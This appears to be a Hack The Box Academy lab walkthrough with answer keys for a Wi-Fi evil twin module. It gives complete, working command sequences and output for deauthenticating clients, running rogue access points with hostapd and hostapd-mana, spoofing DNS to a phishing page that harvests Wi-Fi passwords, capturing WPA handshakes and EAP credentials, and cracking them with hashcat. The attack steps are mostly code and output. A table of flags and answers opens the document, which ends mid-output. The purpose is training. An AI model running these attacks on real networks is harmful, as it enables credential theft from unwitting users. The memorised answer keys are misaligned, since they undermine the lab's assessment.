
| Section | Question Number | Answer |
| --- | --- | --- |
| Evil Twin Attack on WPA2 | Question 1 | S3cr3tpass |
| Karma & Mana Attacks | Question 1 | baseball |
| Karma & Mana Attacks | Question 2 | S3curePassword |
| Evil Twin Attack on WPA3 | Question 1 | StR0nGPassword |
| Enterprise Evil Twin Attack | Question 1 | september |
| Using Fluxion | Question 1 | hrdpasswordhere |
| Using Airgeddon | Question 1 | SuperS3cretP4ssw0rd123 |
| Using WifiPhisher | Question 1 | F1rMwareUPgrad3 |
| Using WifiPhisher | Question 2 | HTB{Cli1nt\_C0mpromIs3} |
| Using EAPHammer | Question 1 | S3pt3mBer |
| DNS Spoofing (Config) | Question 1 | DONE |
| DNS Spoofing (Attack) | Question 1 | j3rry123 |
| DNS Spoofing (Attack) | Question 2 | t0miscool |
| SSL Interception | Question 1 | SSLinterc3ption |
| Wi-Fi Evil Twin Attacks - Skills Assessment | Question 1 | Puls3Gr3dSecured |
| Wi-Fi Evil Twin Attacks - Skills Assessment | Question 2 | HTB{WPA3\_Client\_R3mote\_Cod3\_Ex3cutiON} |
| Wi-Fi Evil Twin Attacks - Skills Assessment | Question 3 | john:rangers |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Evil Twin Attack on WPA2

## Question 1

### "Perform the evil twin attack as demonstrated in this section. What is the discovered value of the WPA PSK?"

To begin, students need to connect to the target VM using remote desktop protocol, providing the credentials `wifi:wifi`.

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.15.251]─[htb-ac-594497@htb-oscw85pyqg]─[~]
└──╼ [★]$ xfreerdp /v:10.129.85.251 /u:wifi /p:wifi /dynamic-resolution 

[19:18:25:496] [15538:15539] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[19:18:26:898] [15538:15539] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[19:18:26:898] [15538:15539] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[19:18:26:926] [15538:15539] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[19:18:26:927] [15538:15539] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[19:18:26:927] [15538:15539] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
<SNIP>
```

Next, students need to enable monitor mode on the `wlan0` interface.

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@twins:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    193 wpa_supplicant
    204 avahi-daemon
    218 NetworkManager

PHY	Interface	Driver		Chipset

phy2	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
phy3	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
```

Once enabled, students need to use `airodump-ng` to scan for wireless networks, providing the `-w` option to save the results of the scan for later analysis.

Code: shell

```shell
sudo airodump-ng wlan0mon -w HTB -c 1
```

```
wifi@twins:~$ sudo airodump-ng wlan0mon -w HTB -c 1

01:31:59  Created capture file "HTB-01.cap".

 CH  1 ][ Elapsed: 48 s ][ 2025-03-06 01:32 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 52:CD:8C:79:AD:87  -28 100      495       24    0   1   54   WPA2 TKIP   PSK  HTB-Wireless                                                                                                                      

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 52:CD:8C:79:AD:87  02:00:00:00:01:00  -29   54 -54      0       20  
```

Students will discover the `HTB-Wireless` network, along with a single client connected to it.

Now, students need to prepare to perform an Evil-Twin attack, enabling IP forwarding and starting Apache.

Code: shell

```shell
sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
sudo service apache2 start
```

```
wifi@twins:~$ sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
wifi@twinsL~$ sudo service apache2 start
```

Students also need to configure a valid IP address and MAC address for `wlan1`, which will host the Evil-Twin. Students need to choose a MAC address that it is similar to that of the `HTB-Wireless` access point (e.g., changing only the last digit).

Code: shell

```shell
sudo ifconfig wlan1 192.168.0.1/24
sudo ifconfig wlan1 down
sudo macchanger -m 52:CD:8C:79:AD:86 wlan1
sudo ifconfig wlan1 up
```

```
wifi@twins:~$ sudo ifconfig wlan1 192.168.0.1/24
wifi@twins:~$ sudo ifconfig wlan1 down
wifi@twins:~$ sudo macchanger -m 52:CD:8C:79:AD:86 wlan1

Current MAC:   02:00:00:00:03:00 (unknown)
Permanent MAC: 02:00:00:00:03:00 (unknown)
New MAC:       52:cd:8c:79:ad:86 (unknown)

wifi@twins:~$ sudo ifconfig wlan1 up
```

With `wlan1` up and running, students need to configure DNS.

Code: shell

```shell
cat << EOF > dns.conf
interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
EOF
```

```
wifi@twins:~$ cat << EOF > dns.conf
interface=wlan1
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
EOF
```

Students need to subsequently kill the `system-resolved` service (which is occupying port 53), then start the DNS server.

Code: shell

```shell
sudo systemctl stop systemd-resolved
sudo dnsmasq -C dns.conf -d
```

```
wifi@twins:~$ sudo systemctl stop systemd-resolved

wifi@twins:~$ sudo dnsmasq -C dns.conf -d

dnsmasq: started, version 2.90 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset no-nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.0.2 -- 192.168.0.254, lease time 10h
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 127.0.0.53#53
dnsmasq: read /etc/hosts - 7 names
```

Additionally, students need to use `dnsspoof` allow traffic to be redirected to `wlan1`.

Code: shell

```shell
sudo dnsspoof -i wlan1
```

```
wifi@twins:~$ sudo dnsspoof -i wlan1

dnsspoof: listening on wlan1 [udp dst port 53 and not src 192.168.0.1]
```

Next, students need to create the configuration file for the Evil-Twin, then launch it using `hostapd`.

Code: shell

```shell
cat << EOF > hostapd.conf
interface=wlan1
hw_mode=g
ssid=HTB-Wireless
channel=1
driver=nl80211
EOF

sudo hostapd hostapd.conf
```

```
wifi@twins:~$ cat << EOF > hostapd.conf
interface=wlan1
hw_mode=g
ssid=HTB-Wireless
channel=1
driver=nl80211
EOF

wifi@twins:~$ sudo hostapd hostapd.conf 

rfkill: Cannot open RFKILL control device
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 
```

With the Evil-Twin now configured and active, students need to deauthenticate the client connected to the legitimate `HTB-Wireless` network.

Code: shell

```shell
sudo aireplay-ng --deauth 10 -a 52:CD:8C:79:AD:87 -c 02:00:00:00:01:00 wlan0mon
```

```
wifi@twins:~$ sudo aireplay-ng --deauth 10 -a 52:CD:8C:79:AD:87 -c 02:00:00:00:01:00 wlan0mon

02:54:47  Waiting for beacon frame (BSSID: 52:CD:8C:79:AD:87) on channel 1
02:54:47  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
02:54:48  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
02:54:48  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
02:54:49  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
02:54:50  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
02:54:50  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
02:54:51  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
02:54:51  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
02:54:52  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
02:54:52  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
```

In the terminal running `hostapd`, students will see the victim connect.

```
<SNIP>
wlan1: STA 02:00:00:00:01:00 IEEE 802.11: authenticated
wlan1: STA 02:00:00:00:01:00 IEEE 802.11: associated (aid 1)
wlan1: AP-STA-CONNECTED 02:00:00:00:01:00
wlan1: STA 02:00:00:00:01:00 RADIUS: starting accounting session AEA5833C49C9D168
```

After a few moments, the victim will browse to the fake website and enter their password, which is then written to `/var/www/html/passes.lst`. Therefore, students need to read it's contents.

Code: shell

```shell
cat /var/www/html/passes.lst
```

```
wifi@twins:~$ cat /var/www/html/passes.lst

{hidden}
```

The password is revealed.

Answer: `S3cr3tpass`

# Karma & Mana Attacks

## Question 1

### "Perform the Mana attack as demonstrated in this section. What is the password obtained from the client probing for the network named StarLight-Hospital?"

To begin, students need to connect to the target VM using remote desktop protocol, providing the credentials `wifi:wifi`.

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.15.251]─[htb-ac-594497@htb-vtr17q4cjp]─[~]
└──╼ [★]$ xfreerdp /v:10.129.232.18 /u:wifi /p:wifi /dynamic-resolution 

[19:18:25:496] [15538:15539] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[19:18:26:898] [15538:15539] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[19:18:26:898] [15538:15539] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[19:18:26:926] [15538:15539] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[19:18:26:927] [15538:15539] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[19:18:26:927] [15538:15539] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
<SNIP>
```

Next, students need to enable monitor mode on the `wlan0` interface.

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@HTB-Corp:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    193 wpa_supplicant
    204 avahi-daemon
    218 NetworkManager

PHY	Interface	Driver		Chipset

phy2	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
phy3	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
```

Once enabled, students need to use `airodump-ng` to scan for wireless devices.

Code: shell

```shell
sudo airodump-ng wlan0mon
```

```
wifi@HTB-Corp:~$ sudo airodump-ng wlan0mon

 CH  2 ][ Elapsed: 12 s ][ 2025-03-06 03:57 ]

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   72:2B:D7:EF:01:56  -49    0 - 1      6        2                                                                                                                                               
 (not associated)   16:73:E9:A8:40:03  -49    0 - 1      6        2                                                                                                                                               
 (not associated)   FA:0C:86:C0:F6:94  -49    0 - 1     50        6         StarLight-Hospital                                                                                                                    
 (not associated)   02:00:00:00:01:00  -49    0 - 1     50        6         HackTheBox        
```

Students will find several clients who have not associated with an access point, with two of them broadcasting probes for the `StarLight-Hospital` and `HackTheBox` networks.

Consequently, the WPA2 MANA attack must be used in order to obtain the password from the client probing for `StarLight-Hospital`. Students need to configure the `hostapd.conf` file accordingly.

Code: shell

```shell
cat << EOF > hostapd.conf 
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=StarLight-Hospital
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=anything
mana_wpaout=handshake.hccapx
EOF
```

```
wifi@HTB-Corp:~$ cat << EOF > hostapd.conf 
interface=wlan1
driver=nl80211
hw_mode=g
channel=1
ssid=StarLight-Hospital
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=anything
mana_wpaout=handshake.hccapx
EOF
```

Using the aforementioned configuration file, students need to activate the rogue AP.

Code: shell

```shell
sudo hostapd-mana hostapd.conf
```

```
wifi@HTB-Corp:~$ sudo hostapd-mana hostapd.conf 

Configuration file: hostapd.conf
MANA: Captured WPA/2 handshakes will be written to file 'handshake.hccapx'.
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr 72:2b:d7:ef:01:56 and ssid "StarLight-Hospital"
random: Only 15/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 
```

After a few moments, students will see the client connect to the rogue AP, capturing the handshake and saving it to the `handshake.hccapx` file.

Knowing that the handshake can be bruteforced offline, students need to first convert the `handshake.hccapx` file into the `.cap` format. Then, students need to extract the hash using `hcxpcapngtool`.

Code: shell

```shell
hcxhash2cap --hccapx=handshake.hccapx -c handshake.pcap
hcxpcapngtool handshake.pcap -o hash.22000
```

```
wifi@HTB-Corp:~$ hcxhash2cap --hccapx=handshake.hccapx -c handshake.pcap

EAPOLs written to capfile(s): 4 (0 skipped)

wifi@HTB-Corp:~$ hcxpcapngtool handshake.pcap -o hash.22000

hcxpcapngtool 6.2.5 reading from handshake.pcap...

<SNIP>

session summary
---------------
processed cap files...................: 1
```

Students will find that the target VM produces an error when using Hashcat. Therefore, the `/opt.wordlist.txt` file, along with the hash, must be transferred to the Pwnbox.

Students need to enable `ssh` on the target VM.

Code: shell

```shell
sudo service ssh start
```

```
wifi@HTB-Corp:~$ sudo service ssh start
```

Then, from the Pwnbox, students need to use SCP to transfer over the wordlist and the hash.

Code: shell

```shell
scp wifi@STMIP:/opt/wordlist.txt .
scp wifi@STMIP:/home/wifi/hash.22000 .
```

```
┌─[us-academy-1]─[10.10.15.251]─[htb-ac-594497@htb-vtr17q4cjp]─[~]
└──╼ [★]$ scp wifi@10.129.232.18:/opt/wordlist.txt .

The authenticity of host '10.129.232.18 (10.129.232.18)' can't be established.
ED25519 key fingerprint is SHA256:LLZKY0Q+wbEzxANAqBjKvVp3/t+8HSON/l4JpDxmHgo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.232.18' (ED25519) to the list of known hosts.
wifi@10.129.232.18's password: 
wordlist.txt                                  100%  133MB   5.1MB/s   00:26    

┌─[us-academy-1]─[10.10.15.251]─[htb-ac-594497@htb-vtr17q4cjp]─[~]
└──╼ [★]$ scp wifi@10.129.232.18:/home/wifi/hash.22000 .

wifi@10.129.232.18's password: 
hash.22000                                    100%  414     6.8KB/s   00:00  
```

Finally, students need to use Hashcat to crack the hash.

Code: shell

```shell
hashcat -a 0 -m 22000 hash.22000 wordlist.txt --force
```

```
┌─[us-academy-1]─[10.10.15.251]─[htb-ac-594497@htb-vtr17q4cjp]─[~]
└──╼ [★]$ hashcat -a 0 -m 22000 hash.22000 wordlist.txt --force

hashcat (v6.2.6) starting

<SNIP>

6e21f70ea3c780ce764ef675ae8b9001:a6351249c8ca:020000000500:StarLight-Hospital:{hidden}
```

Answer: `baseball`

# Karma & Mana Attacks

## Question 2

### "Perform the Mana attack as demonstrated in this section. What is the password obtained from the client probing for the network named HackTheBox?"

Using the previously established RDP session, students need perform a MANA attack against the client probing for the `HackTheBox` network. However, this time, students need to configure their rogue AP for WPA2 Enterprise.

Code: shell

```shell
cat << EOF > hostapd.conf 
# 802.11 Options
interface=wlan1
ssid=HackTheBox
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=/opt/hostapd-mana/hostapd.eap_user

# Certificates
ca_cert=/opt/hostapd-mana/ca.pem
server_cert=/opt/hostapd-mana/server.pem
private_key=/opt/hostapd-mana/server.key
private_key_passwd=whatever
dh_file=/opt/hostapd-mana/dh

# Mana Configuration
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1
EOF
```

```
wifi@HTB-Corp:~$ cat << EOF > hostapd.conf 
# 802.11 Options
interface=wlan1
ssid=HackTheBox
channel=1
auth_algs=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
wpa=3
hw_mode=g
ieee8021x=1

# EAP Configuration
eap_server=1
eap_user_file=/opt/hostapd-mana/hostapd.eap_user

# Certificates
ca_cert=/opt/hostapd-mana/ca.pem
server_cert=/opt/hostapd-mana/server.pem
private_key=/opt/hostapd-mana/server.key
private_key_passwd=whatever
dh_file=/opt/hostapd-mana/dh

# Mana Configuration
enable_mana=1
mana_loud=1
mana_credout=credentials.creds
mana_eapsuccess=1
mana_wpe=1
EOF
```

Using the new configuration, students need to launch the rogue AP.

Code: shell

```shell
sudo hostapd-mana hostapd.conf 
```

```
wifi@HTB-Corp:~$ sudo hostapd-mana hostapd.conf 

Configuration file: hostapd.conf
MANA: Captured credentials will be written to file 'credentials.creds'.
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr 72:2b:d7:ef:01:56 and ssid "HackTheBox"
random: Only 16/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 
```

Students will see the client connect to the rogue AP via the insecure GTC protocol. As a result, the client's identity is exposed in cleartext.

```
<SNIP>
MANA - Directed probe request for SSID 'HackTheBox' from 02:00:00:00:01:00
MANA - Directed probe request for SSID 'StarLight-Hospital' from fa:0c:86:c0:f6:94
wlan1: STA 02:00:00:00:01:00 IEEE 802.11: authenticated
wlan1: STA 02:00:00:00:01:00 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 02:00:00:00:01:00
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: HTB\Sentinal
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=21
MANA EAP Identity Phase 1: HTB\Sentinal
MANA EAP GTC | HTB\\Sentinal:{hidden}
```

Answer: `S3curePassword`

# Evil Twin Attack on WPA3

## Question 1

### "Perform the evil twin attack as demonstrated in this section. What is the password obtained?"

o begin, students need to connect to the target VM using remote desktop protocol, providing the credentials `wifi:wifi`.

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[us-academy-3]─[10.10.15.111]─[htb-ac-594497@htb-llmhupro9r]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.149 /u:wifi /p:wifi /dynamic-resolution

[20:15:14:164] [104779:104780] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[20:15:14:465] [104779:104780] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[20:15:14:465] [104779:104780] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[20:15:14:487] [104779:104780] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
<SNIP>
```

Next, students need to enable monitor mode on the `wlan0` interface.

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@HTB-Corp:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    180 avahi-daemon
    193 wpa_supplicant
    204 avahi-daemon
    218 NetworkManager

PHY	Interface	Driver		Chipset

phy2	wlan0		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
		(mac80211 monitor mode vif enabled for [phy2]wlan0 on [phy2]wlan0mon)
		(mac80211 station mode vif disabled for [phy2]wlan0)
phy3	wlan1		mac80211_hwsim	HTB Chipset of 802.11 radio(s) for mac80211
```

Once enabled, students need to use `airodump-ng` to scan for wireless networks, providing the `-w` option to save the scan results.

Code: shell

```shell
sudo airodump-ng wlan0mon -w HTB -c 1
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon -w HTB -c 1

01:16:46  Created capture file "HTB-01.cap".

 CH  1 ][ Elapsed: 6 mins ][ 2025-03-8 01:23 ][

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3D:EB:29:D5  -47 100     4092      271    0   1   54   WPA3 CCMP   SAE  HTB-WPAtomic              

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   1E:8D:8C:58:84:DF  -49    0 - 1      0        6                                       
 (not associated)   7E:35:02:3C:4A:1D  -49    0 - 1     10        7                                       
 (not associated)   22:27:18:2C:61:B9  -49    0 - 1     10        7                                       
 D8:D6:3D:EB:29:D5  D2:3F:7C:E4:CD:39  -29    1 - 1     23     1317  PMKID  HTB-WPAtomic  
```

Examining the output of `airodumo-ng`, students will discover the target WPA3 network `HTB-WPAtomic`.

Next, students need to create the configuration for an Evil Twin, specifically one that will perform the Loud MANA attack.

Code: shell

```shell
cat << EOF > mac.conf 
ssid=HTB-WPAtomic
interface=wlan1
channel=1
hw_mode=g

# Mana Attack Configuration
enable_mana=1
mana_loud=1

# WPA AP Configuration
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=PSKmismatchmaker
EOF
```

```
wifi@WiFiIntro:~$ cat << EOF > mac.conf 
ssid=HTB-WPAtomic
interface=wlan1
channel=1
hw_mode=g

# Mana Attack Configuration
enable_mana=1
mana_loud=1

# WPA AP Configuration
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=PSKmismatchmaker
EOF
```

Subsequently students need to configure the MAC address of `wlan1`, making it identical to the MAC address of `HTB-WPAtomic`.

Code: shell

```shell
sudo ifconfig wlan1 down
sudo macchanger -m D8:D6:3D:EB:29:D5 wlan1
sudo ifconfig wlan1 up
```

```
wifi@WiFiIntro:~$ sudo ifconfig wlan1 down

wifi@WiFiIntro:~$ sudo macchanger -m D8:D6:3D:EB:29:D5 wlan1

Current MAC:   7e:35:02:3c:4a:1d (unknown)
Permanent MAC: 02:00:00:00:03:00 (unknown)
New MAC:       d8:d6:3d:eb:29:d5 (unknown)

wifi@WiFiIntro:~$ sudo ifconfig wlan1 up
```

With the `mac.conf` file and `wlan1` interface now configured, students need to launch the Evil Twin.

Code: shell

```shell
sudo hostapd-mana mac.conf
```

```
ifi@WiFiIntro:~$ sudo hostapd-mana mac.conf

Configuration file: mac.conf
rfkill: Cannot open RFKILL control device
Using interface wlan1 with hwaddr d8:d6:3d:eb:29:d5 and ssid "HTB-WPAtomic"
random: Only 19/20 bytes of strong random data available from /dev/random
random: Not enough entropy pool available for secure operations
WPA: Not enough entropy in random pool for secure operations - update keys later when the first station connects
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED 
```

For the next step, students need to deploy an Open-Network AP. Therefore, students need to open a new terminal tab, where they will create the necessary configuration file.

Code: shell

```shell
cat << EOF > open.conf 
interface=wlan2
hw_mode=g
ssid=HTB-WPAtomic
channel=1
driver=nl80211
EOF
```

```
wifi@WiFiIntro:~$ cat << EOF > open.conf 
interface=wlan2
hw_mode=g
ssid=HTB-WPAtomic
channel=1
driver=nl80211
EOF
```

Students also need to configure the DNS/DHCP server , the `wlan2` IP address, and enable IP forwarding.

Code: shell

```shell
cat << EOF > dns.conf
interface=wlan2
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
EOF

sudo ifconfig wlan2 192.168.0.1/24
sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
```

```
wifi@WiFiIntro:~$ cat << EOF > dns.conf
interface=wlan2
dhcp-range=192.168.0.2,192.168.0.254,255.255.255.0,10h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.4.4
server=8.8.8.8
listen-address=127.0.0.1
address=/#/192.168.0.1
log-dhcp
log-queries
EOF

wifi@WiFiIntro:~$ sudo ifconfig wlan2 192.168.0.1/24
wifi@WiFiIntro:~$ sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
```

Now, students are able to launch the DNS server.

Code: shell

```shell
sudo dnsmasq -C dns.conf -d
```

```
wifi@WiFiIntro:~$ sudo dnsmasq -C dns.conf -d

dnsmasq: started, version 2.90 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset no-nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq-dhcp: DHCP, IP range 192.168.0.2 -- 192.168.0.254, lease time 10h
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 8.8.4.4#53
dnsmasq: using nameserver 8.8.8.8#53
dnsmasq: using nameserver 1.1.1.1#53
dnsmasq: read /etc/hosts - 7 names
```

Once the DNS server is up and running, students need to open a new terminal tab. Here, students need to use `dnsspoof` to forward traffic to `wlan2`, which will host the Open-Network AP.

Code: shell

```shell
sudo dnsspoof -i wlan2
```

```
wifi@WiFiIntro:~$ sudo dnsspoof -i wlan2

dnsspoof: listening on wlan2 [udp dst port 53 and not src 192.168.0.1]
```

With Apache already running, students are now ready to launch the second access point.

Code: shell

```shell
sudo hostapd open.conf
```

```
wifi@WiFiIntro:~$ sudo hostapd open.conf

rfkill: Cannot open RFKILL control device
wlan2: interface state UNINITIALIZED->ENABLED
wlan2: AP-ENABLED 
```

In just a few seconds, students are likely to see the victim connect to the Evil Twin, which in turn redirects to the access point running on `wlan2`. To confirm this, students need to check the output from their DNS server, as well as the the output from the `wlan2` AP.

```
<SNIP>
rfkill: Cannot open RFKILL control device
wlan2: interface state UNINITIALIZED->ENABLED
wlan2: AP-ENABLED 
wlan2: STA d2:3f:7c:e4:cd:39 IEEE 802.11: authenticated
wlan2: STA d2:3f:7c:e4:cd:39 IEEE 802.11: associated (aid 1)
wlan2: AP-STA-CONNECTED d2:3f:7c:e4:cd:39
wlan2: STA d2:3f:7c:e4:cd:39 RADIUS: starting accounting session 380872776CADC17A
```

After confirming the connection, students need to read the contents of the `passes.lst` file, which contains the credentials gathered from the phishing site.

Code: shell

```shell
cat /var/www/html/passes.lst 
```

```
wifi@WiFiIntro:~$ cat /var/www/html/passes.lst 

{hidden}
```

Answer: `StR0nGPassword`

# Enterprise Evil Twin Attack

## Question 1

### "Perform the enterprise evil twin attack as demonstrated in this section. What is the password obtained for user Sentinal.Jr?"

To begin, students need to connect to the target VM using remote desktop protocol, providing the credentials `wifi:wifi`.

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[us-academy-4]─[10.10.14.139]─[htb-ac-594497@htb-23iatysq9n]─[~]
└──╼ [★]$ xfreerdp /v:10.129.232.18 /u:wifi /p:wifi /dynamic-resolution 

[19:18:25:496] [15538:15539] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[19:18:26:898] [15538:15539] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[19:18:26:898] [15538:15539] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[19:18:26:926] [15538:15539] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[19:18:26:927] [15538:15539] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[19:18:26:927] [15538:15539] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
<SNIP>
```

Next, students need to enable monitor mode on the `wlan0` interface.

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@HTB-Corp:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
